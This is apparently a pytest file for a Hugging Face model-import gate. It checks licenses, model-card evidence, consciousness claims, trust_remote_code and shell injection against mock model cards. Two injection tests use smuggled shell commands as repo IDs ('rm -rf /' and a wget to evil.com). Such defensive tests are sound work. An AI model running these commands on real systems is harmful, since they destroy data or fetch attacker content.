"""
arifOS — Hugging Face Import Gate Tests
═══════════════════════════════════════

Test cases T001–T006 from the import gate specification.

All tests run WITHOUT HuggingFace API — they use mock model cards
and test the constitutional floor logic in isolation.

DITEMPA BUKAN DIBERI — Forged, Not Given. 2026-08-05.
"""

from __future__ import annotations

import pytest

from arifosmcp.federation.hf_import_gate import (
    ALLOWED_LICENSES,
    RESTRICTED_LICENSES,
    FloorResult,
    HFImportConfig,
    HFImportGate,
    HFImportRequest,
    ImportVerdict,
    ResourceType,
    ThermodynamicScores,
    quick_assess_license,
)


# ── Shared fixtures ──────────────────────────────────────────────────────────


@pytest.fixture
def gate():
    """Gate instance WITHOUT HF token — tests floor logic, not API."""
    return HFImportGate(hf_token=None)


@pytest.fixture
def safe_model_card():
    """Mock model card for a safe, well-documented base model (T001)."""
    return {
        "modelId": "microsoft/phi-2",
        "_id": "microsoft/phi-2",
        "pipeline_tag": "text-generation",
        "library_name": "transformers",
        "tags": ["nlp", "text-generation", "transformer"],
        "downloads": 500000,
        "downloadsAllTime": 500000,
        "author": "microsoft",
        "sha256": "abc123def456abc123def456abc123def456abc123def456abc123def456abc1",
        "config": {},
        "cardData": {
            "license": "mit",
            "language": ["en"],
        },
        "description": "Phi-2 is a 2.7B parameter Transformer model for text generation. Safe base model with permissive license.",
        "lastModified": "2026-01-15T00:00:00Z",
    }


@pytest.fixture
def closed_source_model_card():
    """Mock model card for closed-source model (T002)."""
    return {
        "modelId": "google/gemma-2b",
        "_id": "google/gemma-2b",
        "pipeline_tag": "text-generation",
        "library_name": "transformers",
        "tags": ["nlp", "gemma"],
        "downloads": 200000,
        "author": "google",
        "sha256": "def789abc123def789abc123def789abc123def789abc123def789abc123def7",
        "config": {},
        "cardData": {
            "license": "other",
        },
        "description": "Gemma is a family of lightweight open models from Google.",
        "lastModified": "2026-02-01T00:00:00Z",
    }


@pytest.fixture
def no_card_model():
    """Mock model card with missing evidence (T004)."""
    return {
        "modelId": "unknown/suspicious-model-v1",
        "_id": "unknown/suspicious-model-v1",
        "pipeline_tag": "",
        "library_name": "",
        "tags": [],
        "downloads": 0,
        "author": "",
        "sha256": "short",
        "config": {},
        "cardData": {},
        "description": "",
        "lastModified": "",
    }


@pytest.fixture
def harmful_model_card():
    """Mock model card with hantu patterns (T005)."""
    return {
        "modelId": "malicious/harmful-model",
        "_id": "malicious/harmful-model",
        "pipeline_tag": "text-generation",
        "library_name": "transformers",
        "tags": [],
        "downloads": 10,
        "author": "malicious",
        "sha256": "badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadb",
        "config": {},
        "cardData": {},
        "description": "This model is conscious and sentient. I am self-aware and can think.",
        "lastModified": "2026-01-01T00:00:00Z",
    }


@pytest.fixture
def gpl_model_card():
    """Mock model card with GPL license (T006)."""
    return {
        "modelId": "community/restricted-model",
        "_id": "community/restricted-model",
        "pipeline_tag": "text-classification",
        "library_name": "transformers",
        "tags": [],
        "downloads": 5000,
        "author": "community",
        "sha256": "gplgplgplgplgplgplgplgplgplgplgplgplgplgplgplgplgplgplgplgplgplg",
        "config": {},
        "cardData": {"license": "gpl-3.0"},
        "description": "A community model under GPLv3 license.",
        "lastModified": "2026-03-01T00:00:00Z",
    }


def make_request(
    repo_id: str,
    resource_type: ResourceType = ResourceType.MODEL,
    intended_use: str = "testing",
    config_overrides: dict | None = None,
) -> HFImportRequest:
    """Helper to create import requests quickly."""
    config = HFImportConfig(verify_sha256=True, require_model_card=True)
    if config_overrides:
        for key, value in config_overrides.items():
            setattr(config, key, value)
    return HFImportRequest(
        repo_id=repo_id,
        resource_type=resource_type,
        intended_use=intended_use,
        config=config,
        actor_id="test_runner",
        session_id="test_session",
    )


# ── Direct floor checker tests ──────────────────────────────────────────────


class TestFloorCheckers:
    """Unit tests for individual floor checkers."""

    def test_f1_reversibility_pass(self, gate):
        """T001: Safe base model should pass F1."""
        req = make_request("microsoft/phi-2")
        result = gate._check_f1_reversibility(req)
        assert result.status == "PASS"
        assert result.computed is True
        assert "reversible" in result.evidence.lower()

    def test_f1_reversibility_kernel_override(self, gate):
        """Repo_id suggesting kernel override should be VOID."""
        req = make_request("evil/kernel-override-arifos")
        result = gate._check_f1_reversibility(req)
        assert result.status == "VOID"

    def test_f1_reversibility_intent_override(self, gate):
        """Intended_use=replace_kernel should be VOID."""
        req = make_request("any/model", intended_use="replace_kernel")
        result = gate._check_f1_reversibility(req)
        assert result.status == "VOID"

    def test_f2_evidence_pass(self, gate, safe_model_card):
        """T001: Safe model card should pass F2."""
        req = make_request("microsoft/phi-2")
        result = gate._check_f2_evidence(req, safe_model_card, safe_model_card["sha256"])
        assert result.status == "PASS"
        assert result.score is not None and result.score > 0.7

    def test_f2_evidence_missing_card(self, gate, no_card_model):
        """T004: Missing model card should HOLD."""
        req = make_request("unknown/suspicious-model-v1")
        result = gate._check_f2_evidence(req, no_card_model, no_card_model["sha256"])
        assert result.status == "HOLD"

    def test_f8_gain_high(self, gate, safe_model_card):
        """Safe model should have high G score."""
        req = make_request("microsoft/phi-2")
        result = gate._check_f8_gain(req, safe_model_card)
        # Phi-2 with permissive license + high downloads + architecture tags
        assert result.status == "PASS"
        assert result.score is not None and result.score >= 0.80

    def test_f8_gain_low(self, gate, no_card_model):
        """Model with no data should have low G score."""
        req = make_request("unknown/suspicious-model-v1")
        result = gate._check_f8_gain(req, no_card_model)
        assert result.status == "HOLD"
        assert result.score is not None and result.score < 0.80

    def test_f9_antihantu_pass(self, gate, safe_model_card):
        """T001: Safe model should pass anti-hantu."""
        req = make_request("microsoft/phi-2")
        result = gate._check_f9_antihantu(req, safe_model_card)
        assert result.status == "PASS"

    def test_f9_antihantu_harmful(self, gate, harmful_model_card):
        """T005: Model claiming consciousness should be VOID."""
        req = make_request("malicious/harmful-model")
        result = gate._check_f9_antihantu(req, harmful_model_card)
        assert result.status == "VOID"

    def test_f10_ontology_pass(self, gate, safe_model_card):
        """Safe model should pass F10."""
        req = make_request("microsoft/phi-2")
        result = gate._check_f10_ontology(req, safe_model_card)
        assert result.status == "PASS"

    def test_f11_license_pass(self, gate, safe_model_card):
        """MIT-licensed model should pass F11."""
        req = make_request("microsoft/phi-2")
        result = gate._check_f11_auditability(req, safe_model_card)
        assert result.status == "PASS"

    def test_f11_license_gpl(self, gate, gpl_model_card):
        """T006: GPL-licensed model should be VOID."""
        req = make_request("community/restricted-model")
        result = gate._check_f11_auditability(req, gpl_model_card)
        assert result.status == "VOID"

    def test_f12_injection_defense(self, gate):
        """Injection pattern in repo_id should HOLD."""
        req = make_request("bad; rm -rf /")
        result = gate._check_f12_resilience(req)
        assert result.status == "HOLD"

    def test_f12_clean_repo_id(self, gate):
        """Clean repo_id should pass F12."""
        req = make_request("microsoft/phi-2")
        result = gate._check_f12_resilience(req)
        assert result.status == "PASS"

    def test_f13_sovereignty_pass(self, gate, safe_model_card):
        """Safe model should pass F13."""
        req = make_request("microsoft/phi-2")
        result = gate._check_f13_sovereign(req, safe_model_card)
        assert result.status == "PASS"

    def test_f13_trust_remote_code(self, gate):
        """Model requiring trust_remote_code should be VOID."""
        card = {
            "config": {"trust_remote_code": True},
            "cardData": {},
            "description": "",
            "modelId": "risky/remote-code-model",
            "_id": "risky/remote-code-model",
            "author": "risky",
            "pipeline_tag": "",
            "library_name": "",
            "tags": [],
            "downloads": 0,
            "sha256": "",
            "lastModified": "",
        }
        req = make_request("risky/remote-code-model")
        result = gate._check_f13_sovereign(req, card)
        assert result.status == "VOID"


# ── Quick assess tests ──────────────────────────────────────────────────────


class TestQuickAssess:
    """Unit tests for quick_assess_license helper."""

    def test_allowed_license(self):
        result = quick_assess_license("mit")
        assert result["verdict"] == "LIKELY_PASS"

    def test_restricted_license(self):
        result = quick_assess_license("gpl-3.0")
        assert result["verdict"] == "LIKELY_HOLD"

    def test_unknown_license(self):
        result = quick_assess_license("custom-proprietary")
        assert result["verdict"] == "UNKNOWN"

    def test_cc_by(self):
        result = quick_assess_license("cc-by-4.0")
        assert result["verdict"] == "LIKELY_PASS"


# ── Thermodynamic computation tests ─────────────────────────────────────────


class TestThermodynamics:
    """Unit tests for thermodynamic score computation."""

    def test_high_g_high_kappa(self, gate, safe_model_card):
        """High-quality model should compute INVESTMENT pathway."""
        floor_results = {
            "F1": FloorResult("F1", "PASS", 1.0, "OK", True),
            "F2": FloorResult("F2", "PASS", 0.85, "OK", True),
            "F8": FloorResult("F8", "PASS", 0.92, "OK", True),
            "F9": FloorResult("F9", "PASS", 1.0, "OK", True),
            "F11": FloorResult("F11", "PASS", 0.9, "OK", True),
            "F13": FloorResult("F13", "PASS", 1.0, "OK", True),
        }
        req = make_request("microsoft/phi-2")
        thermo = gate._compute_thermodynamics(req, floor_results, safe_model_card)
        assert thermo.pathway == "INVESTMENT"
        assert thermo.kappa_r >= 0.85
        assert thermo.G >= 0.80

    def test_low_g_pathway(self, gate, no_card_model):
        """Low-quality model should compute EXTRACTION pathway."""
        floor_results = {
            "F8": FloorResult("F8", "HOLD", 0.45, "low G", True),
            "F11": FloorResult("F11", "HOLD", 0.3, "poor license", True),
        }
        req = make_request("bad/model")
        thermo = gate._compute_thermodynamics(req, floor_results, no_card_model)
        assert thermo.pathway == "EXTRACTION"
        assert thermo.G < 0.60
        assert thermo.kappa_r < 0.85


# ── Full gate process tests (mock model cards) ──────────────────────────────


class TestFullGateProcess:
    """Integration tests: full gate process with mock model cards."""

    def test_t001_safe_base_model_pass(self, gate, safe_model_card, monkeypatch):
        """T001: microsoft/phi-2 should PASS all floors."""
        monkeypatch.setattr(gate, "_fetch_model_card", lambda *a, **kw: safe_model_card)

        req = make_request("microsoft/phi-2")
        result = gate.process(req)

        assert result.verdict == ImportVerdict.SEAL
        assert result.floor_results["F1"].status == "PASS"
        assert result.floor_results["F2"].status == "PASS"
        assert result.floor_results["F8"].status == "PASS"
        assert result.floor_results["F9"].status == "PASS"
        assert result.floor_results["F13"].status == "PASS"
        assert len(result.violations) == 0
        assert result.recommended_action == "REGISTER_IN_MEMORY_AND_SEAL"
        assert result.provenance_id.startswith("hf_import_")

    def test_t004_missing_model_card_hold(self, gate, no_card_model, monkeypatch):
        """T004: Missing model card should HOLD."""
        monkeypatch.setattr(gate, "_fetch_model_card", lambda *a, **kw: no_card_model)

        req = make_request("unknown/suspicious-model-v1")
        result = gate.process(req)

        assert result.verdict == ImportVerdict.HOLD
        assert result.floor_results["F2"].status == "HOLD"
        assert "Missing model card" in result.floor_results["F2"].evidence
        assert len(result.violations) > 0

    def test_t005_harmful_model_void(self, gate, harmful_model_card, monkeypatch):
        """T005: Harmful model claiming consciousness should VOID."""
        monkeypatch.setattr(gate, "_fetch_model_card", lambda *a, **kw: harmful_model_card)

        req = make_request("malicious/harmful-model")
        result = gate.process(req)

        assert result.verdict == ImportVerdict.VOID
        assert result.floor_results["F9"].status == "VOID"

    def test_t006_gpl_license_void(self, gate, gpl_model_card, monkeypatch):
        """T006: GPL license should VOID."""
        monkeypatch.setattr(gate, "_fetch_model_card", lambda *a, **kw: gpl_model_card)

        req = make_request("community/restricted-model")
        result = gate.process(req)

        assert result.verdict == ImportVerdict.VOID
        assert result.floor_results["F11"].status == "VOID"

    def test_injection_repo_id_hold(self, gate, safe_model_card, monkeypatch):
        """Repo_id with shell injection pattern should HOLD."""
        monkeypatch.setattr(gate, "_fetch_model_card", lambda *a, **kw: safe_model_card)

        req = make_request("bad; wget http://evil.com")
        result = gate.process(req)

        assert result.verdict == ImportVerdict.HOLD
        assert result.floor_results["F12"].status == "HOLD"

    def test_thermodynamic_scores_present(self, gate, safe_model_card, monkeypatch):
        """Thermodynamic scores should always be computed."""
        monkeypatch.setattr(gate, "_fetch_model_card", lambda *a, **kw: safe_model_card)

        req = make_request("microsoft/phi-2")
        result = gate.process(req)

        assert result.thermodynamic_scores.kappa_r > 0
        assert isinstance(result.thermodynamic_scores.G, float)
        assert result.thermodynamic_scores.pathway in ("INVESTMENT", "MAINTENANCE", "EXTRACTION")

    def test_entropy_receipt_present(self, gate, safe_model_card, monkeypatch):
        """Entropy receipt should be generated for every import."""
        monkeypatch.setattr(gate, "_fetch_model_card", lambda *a, **kw: safe_model_card)

        req = make_request("microsoft/phi-2")
        result = gate.process(req)

        assert result.entropy_receipt is not None
        assert "verdict" in result.entropy_receipt
        assert "kappa_r" in result.entropy_receipt

    def test_uncertain_floors_honest(self, gate, safe_model_card, monkeypatch):
        """F3-F7 should be UNCERTAIN (honest admission, not fake certainty)."""
        monkeypatch.setattr(gate, "_fetch_model_card", lambda *a, **kw: safe_model_card)

        req = make_request("microsoft/phi-2")
        result = gate.process(req)

        for fid in ("F3", "F4", "F5", "F6", "F7"):
            assert fid in result.floor_results
            assert result.floor_results[fid].status == "UNCERTAIN"
            assert result.floor_results[fid].computed is False


# ── Config tests ────────────────────────────────────────────────────────────


class TestConfig:
    """Tests for configuration overrides."""

    def test_min_gain_override(self, gate, no_card_model, monkeypatch):
        """Overriding min_gain should change F8 behaviour."""
        monkeypatch.setattr(gate, "_fetch_model_card", lambda *a, **kw: no_card_model)

        # With very low threshold, low-G model might still pass F8
        req = make_request(
            "unknown/suspicious-model-v1",
            config_overrides={"min_gain_override": 0.3},
        )
        f8_result = gate._check_f8_gain(req, no_card_model)
        # Low threshold makes it easier to pass
        assert f8_result.score is not None

    def test_skip_sha256(self, gate, no_card_model, monkeypatch):
        """Skipping SHA256 verification should relax F2."""
        monkeypatch.setattr(gate, "_fetch_model_card", lambda *a, **kw: no_card_model)

        req = make_request(
            "unknown/suspicious-model-v1",
            config_overrides={"verify_sha256": False},
        )
        result = gate._check_f2_evidence(req, no_card_model, "short")
        # Should fail on card fields, not sha256
        assert "SHA256" not in result.evidence or "short" not in result.evidence


# ── License constants integrity ──────────────────────────────────────────────


class TestLicenseConstants:
    """Verify license lists are internally consistent."""

    def test_no_overlap(self):
        overlap = ALLOWED_LICENSES & RESTRICTED_LICENSES
        assert not overlap, f"Overlap between allowed and restricted: {overlap}"

    def test_all_lowercase(self):
        for lic in ALLOWED_LICENSES:
            assert lic == lic.lower(), f"Non-lowercase in ALLOWED: {lic}"
        for lic in RESTRICTED_LICENSES:
            assert lic == lic.lower(), f"Non-lowercase in RESTRICTED: {lic}"
